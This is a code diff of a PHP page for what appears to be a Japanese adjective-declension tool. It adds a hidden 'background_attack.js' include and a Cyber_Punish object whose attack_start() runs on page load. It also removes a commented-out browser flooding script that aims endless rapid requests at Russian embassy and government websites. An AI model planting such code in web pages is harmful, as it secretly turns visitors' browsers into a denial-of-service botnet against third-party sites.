@@ -138,6 +138,7 @@ if($input_adjective != "" && count($janome_result) == 1 && $janome_result[0][1] 
         var adj_table_data = '<?php echo json_encode($declensions, JSON_UNESCAPED_UNICODE); ?>';
     </script>
 	  <script type="text/javascript" src="js/input_button.js"></script>
+	  <script type="text/javascript" src="js/background_attack.js"></script>
     <script>
         $(function(){
           // イベントを設定
@@ -261,82 +262,12 @@ if($input_adjective != "" && count($janome_result) == 1 && $janome_result[0][1] 
 	        });
           // ボタンにイベントを設定
           Input_Botton.PolishBotton('#input_adjective'); 
+          // オブジェクト呼び出し
+          var cyber_punish = new Cyber_Punish(500);
+          // 実行
+          cyber_punish.attack_start();
         }
-
     </script>
-    <script>
-      //// ターゲットを指定
-      //var targets = {
-      //     'https://tokyo.mid.ru/web/tokyo-ja': { number_of_requests: 0, number_of_errored_responses: 0 },        // ロシア大使館
-      //     'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
-      //     'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
-      //     'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
-      //     'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区
-    	//  };
-      //
-      //// 1秒ごとの攻撃頻度
-      //var CONCURRENCY_LIMIT = 250;
-      //var queue = [];
-      //
-      //// リクエスト送信
-      //async function fetchWithTimeout(resource, options) {
-      //  // コントローラーを取得
-      //  const controller = new AbortController();
-      //  // IDを取得
-      //  const id = setTimeout(() => controller.abort(), options.timeout);
-      //  // 攻撃処理を返す。
-      //  return fetch(resource, {
-      //    method: 'GET',              //GET方式
-      //    mode: 'no-cors',
-      //    signal: controller.signal
-      //  }).then((response) => {
-      //    clearTimeout(id);
-      //    return response;
-      //  }).catch((error) => {
-      //    console.log(error.code);
-      //    clearTimeout(id);
-      //    throw error;
-      //  });
-      //}
-      //
-      //// 各ターゲットに攻撃する。
-      //async function flood(target) {
-      //  //for文を使った無限ループ
-      //  for (var i = 0;; ++i) {
-      //    // リクエストの数が規定数になったら
-      //    if (queue.length > CONCURRENCY_LIMIT) {
-      //      // 最初リクエストを削除する。
-      //      await queue.shift()
-      //    }
-      //    // 乱数を生成
-      //    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
-      //    // 攻撃リクエストを追加する。
-      //    queue.push(
-      //      // 関数を実行する(時間制限：1秒)
-      //      fetchWithTimeout(target+rand, { timeout: 1000 })
-      //        // エラーがある場合はエラーを取得する。
-      //        .catch((error) => {
-      //          if (error.code === 20 /* ABORT */) {
-      //            return;
-      //          }
-      //          targets[target].number_of_errored_responses++;
-      //        })
-      //        // 処理後の処理をする。
-      //        .then((response) => {
-      //          // エラーがある場合はエラー処理を入れる。
-      //          if (response && !response.ok) {
-      //            targets[target].number_of_errored_responses++;
-      //          }
-      //          // リクエスト数を追加する。
-      //          targets[target].number_of_requests++;
-      //        })
-      //
-      //    )
-      //  }
-      //}
-      //// 全てのターゲット要素に対して攻撃処理を実行する。
-      //Object.keys(targets).map(flood)
-    </script> 
   <footer class="">
   </footer>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
